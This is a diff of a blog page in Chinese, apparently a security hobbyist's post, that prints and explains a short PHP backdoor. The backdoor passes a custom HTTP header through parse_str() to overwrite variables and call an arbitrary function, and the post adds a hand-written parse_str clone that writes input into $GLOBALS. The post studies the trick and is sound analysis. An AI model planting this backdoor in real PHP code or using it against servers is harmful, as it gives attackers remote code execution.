@@ -6,18 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://c0der1iu.github.io">
-  <title>PHP_parse_str | C0d3r1iu&#39;s Blog</title>
+  <title>PHP函数之parse_str() | C0d3r1iu&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Keep Foolish">
+  <meta name="description" content="今天看到一个后门，自己看了一会儿并没有认出怎么用，后来查找资料复现执行了一下，记录一下： 后门是这样的： 1234567&amp;lt;? php$opt_x = $_SERVER[&apos;HTTP_X&apos;]; if(strlen($opt_x)&amp;gt;20) &amp;#123; 	parse_str($opt_x); 	$cfg($opt); 	&amp;#125;?&amp;gt;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP_parse_str">
+<meta property="og:title" content="PHP函数之parse_str()">
 <meta property="og:url" content="http://c0der1iu.github.io/2018/03/04/PHP-parse-str/index.html">
 <meta property="og:site_name" content="C0d3r1iu&#39;s Blog">
-<meta property="og:description" content="Keep Foolish">
-<meta property="og:updated_time" content="2018-03-04T10:15:16.685Z">
+<meta property="og:description" content="今天看到一个后门，自己看了一会儿并没有认出怎么用，后来查找资料复现执行了一下，记录一下： 后门是这样的： 1234567&amp;lt;? php$opt_x = $_SERVER[&apos;HTTP_X&apos;]; if(strlen($opt_x)&amp;gt;20) &amp;#123; 	parse_str($opt_x); 	$cfg($opt); 	&amp;#125;?&amp;gt;">
+<meta property="og:updated_time" content="2018-03-04T12:49:34.437Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP_parse_str">
-<meta name="twitter:description" content="Keep Foolish">
+<meta name="twitter:title" content="PHP函数之parse_str()">
+<meta name="twitter:description" content="今天看到一个后门，自己看了一会儿并没有认出怎么用，后来查找资料复现执行了一下，记录一下： 后门是这样的： 1234567&amp;lt;? php$opt_x = $_SERVER[&apos;HTTP_X&apos;]; if(strlen($opt_x)&amp;gt;20) &amp;#123; 	parse_str($opt_x); 	$cfg($opt); 	&amp;#125;?&amp;gt;">
   
   
     <link rel="icon" href="/faction/head.jpg">
@@ -152,7 +152,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      PHP_parse_str
+      PHP函数之parse_str()
     </h1>
   
 
@@ -165,7 +165,22 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>今天看到一个后门，自己看了一会儿并没有认出怎么用，后来查找资料复现执行了一下，记录一下：</p>
+<p>后门是这样的：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span> php</span></span><br><span class="line"><span class="php">$opt_x = $_SERVER[<span class="string">'HTTP_X'</span>]; </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($opt_x)&gt;<span class="number">20</span>) &#123; </span></span><br><span class="line"><span class="php">	parse_str($opt_x); </span></span><br><span class="line"><span class="php">	$cfg($opt); </span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>首先给$opt_x传入$_SERVER[‘HTTP_X’]（在http头传输X: xxxx 就可以了）</p>
+<p>如果长度大于20，则执行parse_str($opt_x)</p>
+<p>parse_str()的作用是把传入的字符串解析成多个变量</p>
+<p>之后就可以通过这个变量覆盖$cfg和$opt,执行任意代码了。</p>
+<p>这波骚操作两个点，分别说一下：</p>
+<h4 id="1-SERVER-HTTP-XXXXXX"><a href="#1-SERVER-HTTP-XXXXXX" class="headerlink" title="1.$SERVER[HTTP_XXXXXX]"></a>1.$SERVER[HTTP_XXXXXX]</h4><p>经过测试，将XXXX替换成任意大写英文都可以实现通过自定义HTTP头传参，以前没怎么注意过，还以为是改了中间件配置才实现的。</p>
+<h4 id="2-parse-str-函数"><a href="#2-parse-str-函数" class="headerlink" title="2.parse_str()函数"></a>2.parse_str()函数</h4><p><code>void parse_str ( string $encoded_string [, array &amp;$result ] )</code></p>
+<p>如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。</p>
+<p>自己根据功能写了一个简易版的parse_str()函数</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">Myparse_str</span><span class="params">($encode)</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="comment">//判断参数是否符合要求</span></span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($encode==<span class="string">''</span>||strpos($encode,<span class="string">"="</span>)==<span class="keyword">false</span>)</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">return</span> <span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//确定变量数量,用于处理多个变量需求</span></span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>(strpos($encode,<span class="string">"&amp;"</span>)!==<span class="keyword">false</span> )</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		$encode=explode(<span class="string">"&amp;"</span>,$encode);	</span></span><br><span class="line"><span class="php">		<span class="keyword">foreach</span> ($encode <span class="keyword">as</span> $param)</span></span><br><span class="line"><span class="php">		&#123;</span></span><br><span class="line"><span class="php"><span class="comment">//限制两个数组，避免多个等号的情况</span></span></span><br><span class="line"><span class="php">			$param=explode(<span class="string">"="</span>,$param,<span class="number">2</span>);</span></span><br><span class="line"><span class="php">			$GLOBALS[$param[<span class="number">0</span>]]=$param[<span class="number">1</span>];			</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//单一变量转换</span></span></span><br><span class="line"><span class="php">	<span class="keyword">else</span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		$encode=explode(<span class="string">"="</span>,$encode,<span class="number">2</span>);</span></span><br><span class="line"><span class="php">	    $GLOBALS[$encode[<span class="number">0</span>]]=$encode[<span class="number">1</span>];</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h5 id="感想"><a href="#感想" class="headerlink" title="感想:"></a>感想:</h5><p>php真是神奇的语言啊，一个超全局变量不仅名字霸气功能也方便，简单粗暴exciting!</p>
+
       
 
       
